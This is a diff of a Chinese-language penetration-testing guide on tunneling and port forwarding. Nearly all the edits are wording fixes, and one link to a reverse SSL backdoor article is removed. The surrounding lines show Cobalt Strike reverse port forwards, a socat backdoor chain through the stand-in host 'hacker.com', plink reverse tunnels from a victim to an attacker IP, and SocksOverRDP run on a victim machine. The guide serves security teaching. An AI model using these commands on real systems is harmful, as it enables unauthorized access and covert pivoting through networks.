@@ -153,13 +153,13 @@ rportfwd stop [bind port]
 需要注意：
 
 - Beacon 的反向端口转发旨在 **将流量隧道传输到 Team Server，而不是在单个机器之间中继**。
-- 流量在 **Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
+- 流量是 **在 Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
 - **不需要管理员权限** 来在高端口上创建反向端口转发。
 
 ### rPort2Port 本地
 
 > [!WARNING]
-> 在这种情况下，**端口在 beacon 主机上打开**，而不是在 Team Server 上，**流量发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的 host:port。
+> 在这种情况下，**端口是在 beacon 主机上打开的**，而不是在 Team Server 上，**流量被发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的 host:port。
 ```
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -290,8 +290,6 @@ victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
-
 ### SSL Socat Tunnel
 
 **/bin/sh console**
@@ -322,7 +320,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 它就像一个控制台版本的 PuTTY（选项与 ssh 客户端非常相似）。
 
-由于这个二进制文件将在受害者的机器上执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便能够建立反向连接。然后，要将仅本地可访问的端口转发到我们机器上的一个端口：
+由于这个二进制文件将在受害者的机器上执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便能够建立反向连接。然后，将仅本地可访问的端口转发到我们机器上的一个端口：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -343,24 +341,24 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-您需要拥有**系统的 RDP 访问权限**。\
+您需要拥有 **系统的 RDP 访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 的远程桌面服务功能中的`Dynamic Virtual Channels`（`DVC`）。DVC 负责**在 RDP 连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责 **在 RDP 连接上隧道数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
+在您的客户端计算机上加载 **`SocksOverRDP-Plugin.dll`**，如下所示：
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP 插件已启用**，并且它将 **listen** 在 **127.0.0.1:1080**。
+现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP plugin is enabled**，并且它将 **listen** 在 **127.0.0.1:1080**。
 
-通过 **RDP** 连接并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
+通过 **RDP** 连接，并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-现在，在你的机器（攻击者）上确认端口 1080 正在监听：
+现在在你的机器（攻击者）上确认端口 1080 正在监听：
 ```
 netstat -antb | findstr 1080
 ```
@@ -442,7 +440,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### 更改 proxychains DNS
 
-Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件： _/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境**中，可以设置 **域控制器** 的 IP。
+Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件： _/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境** 中，可以设置 **域控制器** 的 IP。
 
 ## Go 中的隧道
 
@@ -480,7 +478,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **是一个可以通过一条命令行将解决方案暴露到互联网的工具。**\
-_&#x45;xposition URI 类似于:_ **UID.ngrok.io**
+_暴露的 URI 类似于:_ **UID.ngrok.io**
 
 ### 安装
 
@@ -494,7 +492,7 @@ chmod a+x ./ngrok
 ```
 ### 基本用法
 
-**文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
+**文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/)。
 
 _如果需要，也可以添加身份验证和 TLS。_
 
